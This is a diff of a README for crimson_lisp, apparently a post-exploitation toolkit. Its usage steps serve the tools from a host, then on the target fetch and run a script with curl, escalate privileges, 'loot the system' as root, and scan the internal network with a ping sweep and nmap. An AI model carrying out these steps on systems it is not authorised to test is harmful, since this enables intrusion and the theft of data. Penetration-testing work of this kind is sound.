@@ -12,22 +12,35 @@
 git clone https://github.com/Karmaz95/crimson_lisp.git
 ```
 # Usage
-```
-### ON THE HOST MACHINE
+## ON THE HOST MACHINE
+```bash
 cd crimson_lisp
 sudo python3 -m http.server 80
-
-### ON THE TARGET MACHINE 
-## 1. DOWNLOAD THE TOOLS
+```
+## ON THE TARGET MACHINE 
+### 1. DOWNLOAD THE TOOLS
+```bash
 curl -s -k http://127.0.0.1/lisp.sh -o lisp.sh; chmod +x lisp.sh
 ./lisp.sh -u "http://127.0.0.1/"
-
-## 2. ESCALATE THE PRIVILEGES
+```
+### 2. ESCALATE THE PRIVILEGES
+```bash
 ./lisp.sh -e
-
-## 3. LOOT THE SYSTEM
+```
+### 3. LOOT THE SYSTEM
+```bash
 sudo ./lisp.sh -l
 ```
+### 4. NETWORK DISCOVERY (as root)
+#### 4.1. PING SWEEP
+```bash
+./nping INTERNAL_IP/24
+```
+#### 4.2. NMAP SCAN
+```bash
+./run-nmap.sh -Pn INTERNAL_IP -p- --append-output -oA all_ports_scan
+```
+
 # HISTORY
 > If you are curious about how it works, read my blog:
 * [MEDIUM](https://karol-mazurek95.medium.com/crimson-lisp-36d4891437d5)
